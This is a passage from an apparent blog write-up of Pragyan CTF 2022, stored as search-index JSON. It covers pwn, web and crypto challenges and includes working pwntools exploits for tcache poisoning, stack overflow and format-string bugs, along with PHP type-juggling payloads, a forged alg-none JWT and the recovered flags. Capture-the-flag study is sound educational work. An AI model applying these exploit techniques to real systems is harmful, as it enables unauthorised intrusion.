........!....... 0x5555556022e0 0x0000000000000000 0x0000555555602010 ......... `UUU.. \u003c-- tcachebins[0x20][1/2] ... To give a better visualization, below is the current state of the tcache linked_list Total items: 2 0x5555556022c0(head)-\u003e0x00005555556022e0-\u003eNULL As you can see on address 0x5555556022c0, the tcache stored a pointer to the next cache, so that when we do malloc(0x10), tcache will remove its curent head and move the head to its next pointer Before Total items: 2 0x5555556022c0(head)-\u003e0x00005555556022e0-\u003eNULL After malloc(0x10) 0x5555556022c0 address will be used as the new malloc chunk address Total items: 1 0x00005555556022e0(head)-\u003eNULL What happen if we use the heap-overflow to overwrite the tcache pointer? For example, imagine that the current heap chunk is like below ... 0x555555602290 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022a0 0x6161616161616161 0x0a61616161616161 aaaaaaaaaaaaaaa. 0x5555556022b0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022c0 0x00005555556022e0 0x0000555555602010 .\"`UUU... `UUU.. \u003c-- tcachebins[0x20][0/2] 0x5555556022d0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022e0 0x0000000000000000 0x0000555555602010 ......... `UUU.. \u003c-- tcachebins[0x20][1/2] ... Tcache bins: Total items: 2 0x5555556022c0(head)-\u003e0x00005555556022e0-\u003eNULL With update_item, let say we want to read 0x28 string, and we input 0x6161616161616161+0x6161616161616161+0x0000000000000000+0x0000000000000021+0xdeadbeefdeadbabe The chunk after that update will be like below: ... 0x555555602290 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022a0 0x61","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:1:2","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Solution My idea is to overwrite the puts GOT value to secret address with the heap-overflow bug, so that when we call leave, the puts will print the flag. To achieve that, my plan is: Create three items with size 0x10 via insert_item Free the second and third element via delete_item Heap overflow via update_item on the first item, with goals to replace the tcache next pointer to puts GOT address Create one item with size 0x10 via insert_item. Create one more item with size 0x10 and the stored string is the secret address via insert_item. This item will be stored at puts GOT address, and because the string is secret address, now, whenever the binary call puts, it will be resolved to secret instead. Call leave and it will print the flag. Below is the solver: from pwn import * from pwn import p64, u64 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") ''' +-----------------------------+ | 1. Show all data | | 2. Insert a element | | 3. Update a element | | 4. Remove a element | | 5. Exit | +-----------------------------+ ''' def insert_item(r, length, data): r.sendlineafter(b'choice =\u003e ', str(2).encode()) r.sendlineafter(b'of string =\u003e ', str(length).encode()) r.sendafter(b'to save =\u003e ', data) def update_item(r, index, length, data): r.sendlineafter(b'choice =\u003e ', str(3).encode()) r.sendlineafter(b'of element =\u003e ', str(index).encode()) r.sendlineafter(b'of string =\u003e ', str(length).encode()) r.sendafter(b'string =\u003e ', data) def delete_item(r, index): r.sendlineafter(b'choice =\u003e ', str(4).encode()) r.sendlineafter(b'index of element =\u003e ', str(index).encode()) def leave(r): r.sendlineafter(b'choice =\u003e ', str(5).encode()) log.info(r.readrepeat(1)) elf = ELF('database') main_addr = elf.symbols['main'] r = remote('binary.challs.pragyanctf.tech', 6004) r.recvuntil(b'This might help: ') leaked_main = int(r.recvline().strip(), 16) elf.address = leaked_main - main_addr secret_addr = elf.symbols['secret'] puts_got = elf.got['puts'] log.info(f'Leaked main: {hex(leaked_main)}') log.info(f'Base addr : {hex(elf.address)}') log.info(f'Secret addr: {hex(secret_addr)}') log.info(f'Puts got : {hex(puts_got)}') insert_item(r, 16, b'a'*16) insert_item(r, 16, b'a'*16) insert_item(r, 16, b'a'*16) delete_item(r, 2) delete_item(r, 1) update_item(r, 0, 16+8+8+8, b'a'*16+p64(0)+p64(0x21)+p64(puts_got)) insert_item(r, 16, b'a'*16) insert_item(r, 16, p64(secret_addr)) leave(r) [x] Opening connection to binary.challs.pragyanctf.tech on port 6004 [x] Opening connection to binary.challs.pragyanctf.tech on port 6004: Trying 159.203.157.131 [+] Opening connection to binary.challs.pragyanctf.tech on port 6004: Done [*] Leaked main: 0x562483ff3275 [*] Base addr : 0x562483ff2000 [*] Secret addr: 0x562483ff3262 [*] Puts got : 0x5624841f3cd0 [*] p_ctf{Ch4Ng3_1T_t0_M4x1Mum} Flag: p_ctf{Ch4Ng3_1T_t0_M4x1Mum} ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:1:3","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Poly-Flow ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:2:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Intro We were given a binary, let‚Äôs decompile it. Below is the main function undefined4 main(void) { int iVar1; undefined local_21 [16]; undefined local_11; undefined *local_10; local_10 = \u0026stack0x00000004; printf(\"Enter the passphrase: \"); fflush((FILE *)stdout); __isoc99_scanf(\u0026DAT_080d403c,local_21); local_11 = 0; iVar1 = check(local_21); if (iVar1 == 0) { puts(\"Incorrect.\"); } else { input(); } return 0; } Check function undefined4 check(char *param_1) { size_t sVar1; undefined4 uVar2; int local_14; int local_10; sVar1 = strlen(param_1); if (sVar1 == 0x10) { local_10 = 0; for (local_14 = 0; local_14 \u003c 4; local_14 = local_14 + 1) { local_10 = local_10 + *(int *)(param_1 + local_14 * 4); } if (local_10 == L'\\xdeadbeef') { uVar2 = 1; } else { uVar2 = 0; } } else { uVar2 = 0; } return uVar2; } input function void input(void) { char local_1c [20]; if (i.0 == 5) { puts(\"Here is your flag.\"); system(\"cat flag\"); puts(\"\"); } i.0 = i.0 + 1; fgets(local_1c,0x24,(FILE *)stdin); return; } ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:2:1","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Analysis Okay, so the flow is: Need to pass check function, where we need to pass a string, where if it get splitted into 4 chunks where a chunk consist of 4 bytes, the sum of the 4 chunks is 0xdeadbeef. After that we will go to input method. Notice that there is a buffer overflow, where we can replace the return value of input ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:2:2","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Solution So, below is the solver script, where we simply: Pass a string that the 4 chunks sum is 0xdeadbeef And then with BOF, we can ret to the input 5 times, so that the binary will cat the flag. from pwn import * from pwn import p64, u64, p32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") elf = ELF('./Poly-flow') input_addr = elf.symbols['input'] r = remote('binary.challs.pragyanctf.tech', 6002) r.sendafter(b'passphrase: ', p32(0x37ab6fbb)*3+p32(0x37ab6fbb+3)) # deadbeef r.send(b'a'*0x1c + p32(input_addr) + b'a'*0x4) r.send(b'a'*0x1b + p32(input_addr) + b'a'*0x4) # one-byte adjustment based on observation in GDB r.send(b'a'*0x1b + p32(input_addr) + b'a'*0x4) # one-byte adjustment based on observation in GDB r.send(b'a'*0x1b + p32(input_addr) + b'a'*0x4) # one-byte adjustment based on observation in GDB r.send(b'a'*0x1b + p32(input_addr) + b'a'*0x4) # one-byte adjustment based on observation in GDB r.interactive() Flag: p_ctf{mUlT1Pl3_BuFf3R_Ov3rF|0w} ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:2:3","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Portal ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:3:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Intro We were given a binary. Below is the main decompiled: undefined8 main(void) { long in_FS_OFFSET; int local_14; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); local_14 = 0; initialize(); puts(\"Welcome!\"); do { putchar(10); puts(\"What would you like to do?\"); puts(\"1) Check Balance\"); puts(\"2) Upgrade Pack\"); __isoc99_scanf(\u0026DAT_0010218f,\u0026local_14); getchar(); fflush(stdin); if (local_14 == 1) { see_balance(); } else if (local_14 == 2) { init_pack(); } else { if (local_14 != 3) { puts(\"Invalid \"); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } check = 1; see_profile(); check = 0; } puts(\"Bye!\"); } while( true ); } see_balance: void see_balance(void) { long in_FS_OFFSET; char local_78 [104]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); printf(\"You currently have Rs.%d left!\\n\",(ulong)b); puts(\"Wanna upgrade pack?\"); fgets(local_78,100,stdin); printf(local_78); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } init_pack: void init_pack(void) { if (b == 0xf9) { upgrade_pack(); } else { puts(\"You do not have enough balance :(\"); } return; } upgrade_pack undefined8 upgrade_pack(void) { FILE *__stream; char *__s; long in_FS_OFFSET; char local_98 [136]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); __stream = fopen(\"flag_maybe\",\"r\"); if (__stream == (FILE *)0x0) { puts(\"Flag not found.\"); /* WARNING: Subroutine does not return */ exit(1); } fgets(local_98,0x80,__stream); fclose(__stream); puts(\"Upgrading PAcK\"); __s = (char *)malloc(0x12d); puts(\"Enter coupon code:\"); fgets(__s,300,stdin); puts(\"Upgrading pack with the coupon:\"); printf(__s); check = 1; see_profile(); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:3:1","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Analysis Reading through the decompiled code, some notes that we could take: Reading through the see_balance method, we notice bug where format string attack is applicable. In order to call upgrade_pack method, in the init_pack method, we need to make the global variable of b value to 0xf9. Reading through the upgrade_pack method, we notice bug where format string attack is applicable. Flag was stored in the upgrade_pack method stack. Let‚Äôs do checksec to check further mitigation on the binary. Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Okay so the PIE is enabled, which mean we might need to leak the binary base address first. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:3:2","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Solution Based on those notes, my idea to solve this is: With the format string bug on see_balance, I will try to leak the main address, so that I can retrieve the binary base address After that, with the same bug, I will overwrite the value b with 0xf9, so that I can go to the upgrade_pack method. With the format string bug on upgrade_pack method, because the flag was stored in the stack, I can simply leak the flag. Below is the full script of that from pwn import * from pwn import p64, u64, p32, u32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") elf = ELF('./load') r = remote('binary.challs.pragyanctf.tech', 6003) # Leaked main r.sendlineafter(b'Pack\\n', str(1).encode()) fmt_str = b'a'*8 + b'.%19$p.%20$p.%21$p' # the 21th is the main+164 address value r.sendlineafter(b'pack?\\n', fmt_str) out = r.recvline().strip().split(b'.') leaked_main = int(out[-1], 16) elf.address = leaked_main - elf.symbols['main'] - 164 b_addr = elf.symbols[\"b\"] log.info(f'Leaked main: {hex(leaked_main)}') log.info(f'Elf address: {hex(elf.address)}') log.info(f'b address : {hex(b_addr)}') # val = 0xf9 fmt_str = b'%249c%8$naaaaaaa'+p64(b_addr) # 8th index is our p64(b_addr) value, which mean we will write 249 (0xf9) to b variable. log.info(fmt_str) r.sendlineafter(b'Pack\\n', str(1).encode()) r.sendlineafter(b'pack?\\n', fmt_str) r.sendlineafter(b'Pack\\n', str(2).encode()) r.sendlineafter(b'coupon code:\\n', b'%8$p %9$p %10$p %11$p') # Flag was stored in 8th-11th index r.recvline() out = r.recvline().strip().split(b' ')[-4:] flag = b'' for f in out: flag += p64(int(f, 16)) log.info(f'Flag: {flag}') Flag: p_ctf{W3ll_1t_W4s_3aSy_0n1y} Web ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:3:3","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"PHP Train We were given a website with the below source code \u003c?php show_source(\"index.php\"); include 'constants.php'; error_reporting(0); if(isset($_GET[\"param1\"])) { if(!strcmp($_GET[\"param1\"], CONSTANT1)) { echo FLAG1; } } if(isset($_GET[\"param2\"]) \u0026\u0026 isset($_GET[\"param3\"])) { $str2 = $_GET[\"param2\"]; $str3 = $_GET[\"param3\"]; if(($str2 !== $str3) \u0026\u0026 (sha1($str2) === sha1($str3))) { echo FLAG2; } } if(isset($_GET[\"param4\"])) { $str4 = $_GET[\"param4\"]; $str4=trim($str4); if($str4 == '1.2e3' \u0026\u0026 $str4 !== '1.2e3') { echo FLAG3; } } if(isset($_GET[\"param5\"])) { $str5 = $_GET[\"param5\"]; if($str5 == 89 \u0026\u0026 $str5 !== '89' \u0026\u0026 $str5 !== 89 \u0026\u0026 strlen(trim($str5)) == 2) { echo FLAG4; } } if(isset($_GET[\"param6\"])) { $str6 = $_GET[\"param6\"]; if(hash('md4', $str6) == 0) { echo FLAG5; } } if(isset($_GET[\"param7\"])) { $str7 = $_GET[\"param7\"]; $var1 = 'helloworld'; $var2 = preg_replace(\"/$var1/\", '', $str7); if($var1 === $var2) { echo FLAG6; } } if(isset($_GET[\"param8\"])) { $str8 = $_GET[\"param8\"]; $comp = range(1, 25); if(in_array($str8, $comp)) { if(preg_match(\"/\\.env/\", $str8)) { echo FLAG7; } } } ?\u003e So we need to bypass all this check to retrieve the full flag. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 1 To bypass strcmp, we can simply pass param1[]=a. We got p_ctf{ech0_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:1","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 2 To bypass sha1 collision, we can simply pass array to both params (param2[]=a\u0026param3[]=b). We got 1f_7h3_7r41n_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:2","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 3 We just need to pass param4=1200 becaue 1.2e3 is equals to 1200. We got d035_n07_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:3","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 4 We just need to pass param5=89%20 because the value checking is using loose comparison, so the whitespace will be discarded. We got 5t0p_1n_y0ur_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:4","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 5 We just need to pass magic hash as param6=gH0nAdHk, where the hash result prefix is 0e because of the loose comparison. We got 5t4t10n_7h3n_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:5","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 6 We just need to pass param7=hellohelloworldworld, so that after the preg_replace, the param7 value will be helloworld. We got 1t5_n07_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:6","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 7 We just need to pass param8=1.env because in_array use loose comparison, so as long as our first string start with 1, in_array will return true. We got y0ur_7r41n}. Flag: p_ctf{ech0_1f_7h3_7r41n_d035_n07_5t0p_1n_y0ur_5t4t10n_7h3n_1t5_n07_y0ur_7r41n} ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:7","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Inception We were given a website. Checking the source code, we got obfuscated javascript. Now, we just need to examine properly the obfuscated. The first part is this code var _0xa965=[\"\\x65\\x6E\\x74\\x72\\x69\\x65\\x73\",\"\",\"\\x62\",\"\\x61\",\"\\x74\\x6F\",\"\\x6E\\x61\\x6D\\x65\",\"\\x61\\x6C\\x6C\",\"\\x66\\x69\\x6C\\x6C\",\"\\x4D\\x49\\x4E\\x5F\\x56\\x41\\x4C\\x55\\x45\"];(function(){var _0x31e3x1=()=\u003e{ var _0x31e3x2=[][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]][([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([][[]]+ [])[+!+[]] + (![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+[]] + ([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + (!![]+ [])[+!+[]]]((!![]+ [])[+!+[]] + (!![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + ([][[]]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+!+[]] + (+[![]]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+!+[]]] + (!![]+ [])[!+[]+ !+[] + !+[]] + (+(!+[]+ !+[] + !+[] + [+!+[]]))[(!![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([]+ [])[([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([][[]]+ [])[+!+[]] + (![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+[]] + ([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + (!![]+ [])[+!+[]]][([][[]]+ [])[+!+[]] + (![]+ [])[+!+[]] + ((+[])[([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([][[]]+ [])[+!+[]] + (![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+[]] + ([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + (!![]+ [])[+!+[]]] + [])[+!+[]+ [+!+[]]] + (!![]+ [])[!+[]+ !+[] + !+[]]]](!+[]+ !+[] + !+[] + [!+[]+ !+[]]) + (![]+ [])[+!+[]] + (![]+ [])[!+[]+ !+[]])()([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]][([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([][[]]+ [])[+!+[]] + (![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+[]] + ([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + (!![]+ [])[+!+[]]]((!![]+ [])[+!+[]] + (!![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + ([][[]]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+!+[]] + ([]+ [])[(![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([][[]]+ [])[+!+[]] + (!![]+ [])[+[]] + ([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + (![]+ [])[!+[]+ !+[]] + (!![]+ [][","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:5:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Code of Chaos We were given a website, where we need to bypass the login page. Checking the robots.txt, we found the source code of the website. require 'sinatra/base' require 'sinatra' require \"sinatra/cookies\" get '/' do if request.cookies['auth'] @user = getUsername() # getUsername() - Method to get username from cookies if @user.upcase == \"MICHAEL\" return erb :michael end return erb:index else return erb :index end end post '/login' do user = params['username'].to_s[0..20] password = params['password'].to_s[0..20] if user =~ /[A-Z]/ or user == 'michael' info = \"Invalid Username/Password\" return erb :login, :locals =\u003e {:info =\u003e info} elsif password == \"whatever\" and user.upcase == \"MICHAEL\" set_Cookies(user) else info = \"Invalid Username/Password\" return erb :login, :locals =\u003e {:info =\u003e info} end redirect '/' end Okay, so the requirement is, somehow, we need to login with user michael and pass whatever, but we aren‚Äôt allowed to pass michael. And then, the uppercase of our user username should be MICHAEL. How to achieve that? The answer is to use UNICODE. Some unicode will be converted to not-UNICODE during converting it to uppercase. In this case, I use ƒ± unicode, so that the username is mƒ±chael. The upcase result will be MICHAEL, so we can safely login to our website. Okay now we need to get the admin privilege to find the rest of the flag. Checking the cookie, it contains jwt token, which the decrypted result is like below We can try to bypass this by changing the alg to none and change the user value to admin. Generating the forged jwt token, we get the second flag. Forged jwt: eyJ0eXAiOiAiSldTIiwgImFsZyI6ICJub25lIn0.eyJ1c2VyIjogImFkbWluIn0. Flag: p_ctf{un1c0de_4nd_j3t_m4kes_fu7} Crypto ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:6:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"One Try We were given a file like below from Crypto.Util.number import long_to_bytes,bytes_to_long from flag import * assert k.bit_length() == 40 def hide(): p=95237125230167487838272944166423714051165223593288401382688685829040590786990768778438234082000903807362777558583037575230881045249425322887376601259055892460702772000162982010970208724929645212521533513649369206757681770172577467721506667626730799406015091008310940052579697065207083389866466950134622798087 q=124379800279519757231453952571634329234726580565504345524807447690769923505626825913853213968267033307369831541137813374478821479720151365039955869403139958659415082657593784893960018420207872886098820339882222586464425407525431977262528398209506069668083100281117639890041468740215875574081639292225496987247 return pow(bytes_to_long(flag.encode()),k,p*q) def pad(a): if len(a) % 32 != 0: a = ((32-len(a) % 32)*chr(0).encode()) + a return a def encrypt(a, key=k): ct = [i for i in (pad(long_to_bytes(a)))] keys=long_to_bytes(key) for x in range(5): for i in range(32): ct[i]=ct[i]^keys[0] for j in range(len(keys)): ct[i] = (ct[i] ^ keys[j] if i \u0026 2**j != 0 else ct[i]) keys = keys[1:] return ct #print(hide()) #9803360482107840935986732378323704110929708112302712803731012575465683179961905078466611828488789490543493731143558620545390953556032902554822421856356533539501430684361482576102587663520949056746659748698357755897924885992782747151219465028805502494393787119343428804346092071091528754744212809617351149272272380807238804504647510591726329582179077324427249076164587445605982981728078911123292553075494650141966258672901488344682939222675606336207847496023541310374013054536034137315183694024407951884904209160042408478973616348037614424915600220818790089801126821003600059671390406058169258661700548713247796139155 #print(encrypt(69837538996696154134353592503427759134303178119205313290251367614441787869767)) #[153, 102, 39, 242, 39, 149, 117, 232, 221, 111, 183, 6, 70, 46, 4, 222, 85, 178, 233, 81, 4, 186, 240, 74, 238, 81, 27, 83, 14, 154, 143, 1] Reading through the file, we know that we need to know the public exponent value of the RSA Encryption (which is k). We can derive it from the encrypt method. Reading through it, we can simply solve it with z3 to retrieve our k. After getting the k, we can simply do RSA decryption to retrieve the flag. I use sagemath to solve it. from z3 import * from Crypto.Util.number import long_to_bytes,bytes_to_long cipher = 9803360482107840935986732378323704110929708112302712803731012575465683179961905078466611828488789490543493731143558620545390953556032902554822421856356533539501430684361482576102587663520949056746659748698357755897924885992782747151219465028805502494393787119343428804346092071091528754744212809617351149272272380807238804504647510591726329582179077324427249076164587445605982981728078911123292553075494650141966258672901488344682939222675606336207847496023541310374013054536034137315183694024407951884904209160042408478973616348037614424915600220818790089801126821003600059671390406058169258661700548713247796139155 p = 95237125230167487838272944166423714051165223593288401382688685829040590786990768778438234082000903807362777558583037575230881045249425322887376601259055892460702772000162982010970208724929645212521533513649369206757681770172577467721506667626730799406015091008310940052579697065207083389866466950134622798087 q = 124379800279519757231453952571634329234726580565504345524807447690769923505626825913853213968267033307369831541137813374478821479720151365039955869403139958659415082657593784893960018420207872886098820339882222586464425407525431977262528398209506069668083100281117639890041468740215875574081639292225496987247 n = p*q def pad(a): if len(a) % 32 != 0: a = ((32-len(a) % 32)*chr(0).encode()) + a return a aa = BitVec(\"aa\", 8) b = BitVec(\"b\", 8) c = BitVec(\"c\", 8) d = BitVec(\"d\", 8) e = BitVec(\"e\", 8) a = 69837538996696154134353592503427759134303178119205313290251367614441787869767 res = [153, 102, 39, 242, 39","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:7:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Blind Scout We were given base64 of encrypted text, and 5 pem file. I try to check whether there is common factor between the modulus of each file, and I found a common modulus between the second and the fourth pem, which mean now we can factor the second and the fourth pem. Trying to decrypt the encrypted with the second pem gave me the result. sage: n_arr = [101624963561615795807663999026679788748815571421569462807927860956728888493496000977417890670717889501659207162509309001973634584813285 ....: 342662515006961794389212761798054369199413737251594682052270204212522489108642197112766627721236631574948182620021172433826492285874433680636116 ....: 813877578486396232272605937561, 1011616617510531186379147101997466731485620478711403355091755786287415666522860447862499110392145759510656666591 ....: 